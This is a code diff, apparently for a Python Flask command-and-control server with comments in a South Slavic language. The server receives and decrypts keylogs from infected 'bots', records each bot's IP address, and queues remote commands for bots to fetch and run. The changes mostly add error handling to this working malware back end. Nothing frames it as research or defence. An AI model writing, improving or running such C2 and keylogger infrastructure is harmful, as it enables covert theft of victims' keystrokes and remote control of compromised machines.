@@ -43,27 +43,31 @@ print(f"[+] Encryption key loaded: {MY_KEY[:20]}...")
 # BAZA PODATAKA
 # =====================================================================
 def init_db():
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  bot_id TEXT,
-                  data TEXT,
-                  timestamp TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS bots
-                 (bot_id TEXT PRIMARY KEY,
-                  first_seen TEXT,
-                  last_seen TEXT,
-                  ip_address TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS commands
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  bot_id TEXT,
-                  command TEXT,
-                  status TEXT,
-                  result TEXT,
-                  timestamp TEXT)''')
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        c.execute('''CREATE TABLE IF NOT EXISTS keylogs
+                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                      bot_id TEXT,
+                      data TEXT,
+                      timestamp TEXT)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS bots
+                     (bot_id TEXT PRIMARY KEY,
+                      first_seen TEXT,
+                      last_seen TEXT,
+                      ip_address TEXT)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS commands
+                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                      bot_id TEXT,
+                      command TEXT,
+                      status TEXT,
+                      result TEXT,
+                      timestamp TEXT)''')
+        conn.commit()
+        conn.close()
+        print("[+] Database initialized successfully")
+    except Exception as e:
+        print(f"[-] Database initialization error: {e}")
 
 init_db()
 
@@ -86,75 +90,105 @@ def require_auth(f):
 # HELPER FUNKCIJE
 # =====================================================================
 def save_keylog(bot_id, data, timestamp):
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    c.execute("INSERT INTO keylogs (bot_id, data, timestamp) VALUES (?, ?, ?)",
-              (bot_id, data, timestamp))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        c.execute("INSERT INTO keylogs (bot_id, data, timestamp) VALUES (?, ?, ?)",
+                  (bot_id, data, timestamp))
+        conn.commit()
+        conn.close()
+        print(f"[+] Keylog saved for {bot_id}")
+    except Exception as e:
+        print(f"[-] Error saving keylog: {e}")
 
 def save_bot(bot_id, timestamp, ip_address):
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO bots (bot_id, first_seen, last_seen, ip_address) VALUES (?, ?, ?, ?)",
-              (bot_id, timestamp, timestamp, ip_address))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        c.execute("INSERT OR REPLACE INTO bots (bot_id, first_seen, last_seen, ip_address) VALUES (?, ?, ?, ?)",
+                  (bot_id, timestamp, timestamp, ip_address))
+        conn.commit()
+        conn.close()
+        print(f"[+] Bot saved: {bot_id}")
+    except Exception as e:
+        print(f"[-] Error saving bot: {e}")
 
 def update_bot_last_seen(bot_id, timestamp):
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    c.execute("UPDATE bots SET last_seen = ? WHERE bot_id = ?", (timestamp, bot_id))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        c.execute("UPDATE bots SET last_seen = ? WHERE bot_id = ?", (timestamp, bot_id))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        print(f"[-] Error updating bot: {e}")
 
 def get_recent_logs(limit=100):
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    c.execute("SELECT bot_id, data, timestamp FROM keylogs ORDER BY id DESC LIMIT ?", (limit,))
-    logs = [{"bot": row[0], "data": row[1], "time": row[2]} for row in c.fetchall()]
-    conn.close()
-    return logs
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        c.execute("SELECT bot_id, data, timestamp FROM keylogs ORDER BY id DESC LIMIT ?", (limit,))
+        logs = [{"bot": row[0], "data": row[1], "time": row[2]} for row in c.fetchall()]
+        conn.close()
+        return logs
+    except Exception as e:
+        print(f"[-] Error getting logs: {e}")
+        return []
 
 def get_all_bots():
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    c.execute("SELECT bot_id, first_seen, last_seen, ip_address FROM bots")
-    bots = [{"bot_id": row[0], "first_seen": row[1], "last_seen": row[2], "ip": row[3]} for row in c.fetchall()]
-    conn.close()
-    return bots
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        c.execute("SELECT bot_id, first_seen, last_seen, ip_address FROM bots")
+        bots = [{"bot_id": row[0], "first_seen": row[1], "last_seen": row[2], "ip": row[3]} for row in c.fetchall()]
+        conn.close()
+        return bots
+    except Exception as e:
+        print(f"[-] Error getting bots: {e}")
+        return []
 
 def save_command(bot_id, command):
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    timestamp = datetime.datetime.now().isoformat()
-    c.execute("INSERT INTO commands (bot_id, command, status, timestamp) VALUES (?, ?, ?, ?)",
-              (bot_id, command, "pending", timestamp))
-    conn.commit()
-    command_id = c.lastrowid
-    conn.close()
-    return command_id
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        timestamp = datetime.datetime.now().isoformat()
+        c.execute("INSERT INTO commands (bot_id, command, status, timestamp) VALUES (?, ?, ?, ?)",
+                  (bot_id, command, "pending", timestamp))
+        conn.commit()
+        command_id = c.lastrowid
+        conn.close()
+        return command_id
+    except Exception as e:
+        print(f"[-] Error saving command: {e}")
+        return None
 
 def get_pending_command(bot_id):
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    c.execute("SELECT id, command FROM commands WHERE bot_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1",
-              (bot_id,))
-    row = c.fetchone()
-    conn.close()
-    if row:
-        return {"id": row[0], "command": row[1]}
-    return None
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        c.execute("SELECT id, command FROM commands WHERE bot_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1",
+                  (bot_id,))
+        row = c.fetchone()
+        conn.close()
+        if row:
+            return {"id": row[0], "command": row[1]}
+        return None
+    except Exception as e:
+        print(f"[-] Error getting pending command: {e}")
+        return None
 
 def update_command_status(command_id, status, result=None):
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    if result:
-        c.execute("UPDATE commands SET status = ?, result = ? WHERE id = ?", (status, result, command_id))
-    else:
-        c.execute("UPDATE commands SET status = ? WHERE id = ?", (status, command_id))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        if result:
+            c.execute("UPDATE commands SET status = ?, result = ? WHERE id = ?", (status, result, command_id))
+        else:
+            c.execute("UPDATE commands SET status = ? WHERE id = ?", (status, command_id))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        print(f"[-] Error updating command status: {e}")
 
 # =====================================================================
 # RUTE
@@ -183,16 +217,16 @@ def receive_keylog():
         try:
             encrypted = base64.b64decode(log_data)
             decoded_log = cipher.decrypt(encrypted).decode('utf-8', errors='ignore')
-            print(f"[+] Decrypted successfully: {len(decoded_log)} chars")
+            print(f"[+] Decrypted successfully: {len(decoded_log)} chars from {bot_id}")
         except Exception as e:
             print(f"[-] Decryption error: {e}")
             # Fallback: pokušaj da dekodiraš bez enkripcije (za testiranje)
             try:
                 decoded_log = base64.b64decode(log_data).decode('utf-8', errors='ignore')
-                print(f"[+] Fallback: accepted unencrypted data")
+                print(f"[+] Fallback: accepted unencrypted data from {bot_id}")
             except:
                 decoded_log = str(log_data)
-                print(f"[+] Fallback: accepted raw data")
+                print(f"[+] Fallback: accepted raw data from {bot_id}")
         
         # Sačuvaj u bazu
         save_keylog(bot_id, decoded_log, timestamp)
@@ -206,24 +240,29 @@ def receive_keylog():
         
     except Exception as e:
         logging.error(f"Error in receive_keylog: {e}")
+        print(f"[-] Error in receive_keylog: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/command', methods=['GET'])
 @require_auth
 def get_command():
-    bot_id = request.args.get('id')
-    if not bot_id:
-        return jsonify({"status": "error", "message": "Missing bot_id"}), 400
-    
-    command = get_pending_command(bot_id)
-    if command:
-        return jsonify({
-            "status": "ok",
-            "command_id": command["id"],
-            "command": command["command"]
-        })
-    else:
-        return jsonify({"status": "ok", "command": None})
+    try:
+        bot_id = request.args.get('id')
+        if not bot_id:
+            return jsonify({"status": "error", "message": "Missing bot_id"}), 400
+        
+        command = get_pending_command(bot_id)
+        if command:
+            return jsonify({
+                "status": "ok",
+                "command_id": command["id"],
+                "command": command["command"]
+            })
+        else:
+            return jsonify({"status": "ok", "command": None})
+    except Exception as e:
+        print(f"[-] Error in get_command: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/result', methods=['POST'])
 @require_auth
@@ -246,24 +285,38 @@ def command_result():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# API RUTE (za dashboard)
+# API RUTE (za dashboard) - SA TRY/EXCEPT
 # =====================================================================
 @app.route('/api/logs', methods=['GET'])
 def api_logs():
-    return jsonify({"logs": get_recent_logs(100)})
+    try:
+        logs = get_recent_logs(100)
+        return jsonify({"logs": logs})
+    except Exception as e:
+        print(f"[-] Error in api_logs: {e}")
+        return jsonify({"logs": [], "error": str(e)}), 500
 
 @app.route('/api/bots', methods=['GET'])
 def api_bots():
-    return jsonify({"bots": get_all_bots()})
+    try:
+        bots = get_all_bots()
+        return jsonify({"bots": bots})
+    except Exception as e:
+        print(f"[-] Error in api_bots: {e}")
+        return jsonify({"bots": [], "error": str(e)}), 500
 
 @app.route('/api/commands', methods=['GET'])
 def api_commands():
-    conn = sqlite3.connect('c2_database.db')
-    c = conn.cursor()
-    c.execute("SELECT bot_id, command, status, timestamp FROM commands ORDER BY id DESC LIMIT 50")
-    commands = [{"bot_id": row[0], "command": row[1], "status": row[2], "timestamp": row[3]} for row in c.fetchall()]
-    conn.close()
-    return jsonify({"commands": commands})
+    try:
+        conn = sqlite3.connect('c2_database.db')
+        c = conn.cursor()
+        c.execute("SELECT bot_id, command, status, timestamp FROM commands ORDER BY id DESC LIMIT 50")
+        commands = [{"bot_id": row[0], "command": row[1], "status": row[2], "timestamp": row[3]} for row in c.fetchall()]
+        conn.close()
+        return jsonify({"commands": commands})
+    except Exception as e:
+        print(f"[-] Error in api_commands: {e}")
+        return jsonify({"commands": [], "error": str(e)}), 500
 
 @app.route('/api/send_command', methods=['POST'])
 @require_auth
@@ -277,15 +330,17 @@ def api_send_command():
             return jsonify({"status": "error", "message": "Missing fields"}), 400
         
         command_id = save_command(bot_id, command)
-        logging.info(f"Command sent to {bot_id}: {command}")
-        
-        return jsonify({"status": "ok", "command_id": command_id})
+        if command_id:
+            logging.info(f"Command sent to {bot_id}: {command}")
+            return jsonify({"status": "ok", "command_id": command_id})
+        else:
+            return jsonify({"status": "error", "message": "Failed to save command"}), 500
     except Exception as e:
         logging.error(f"Error in api_send_command: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# DASHBOARD TEMPLATE (isti kao prije - nije potrebno mijenjati)
+# DASHBOARD TEMPLATE
 # =====================================================================
 DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
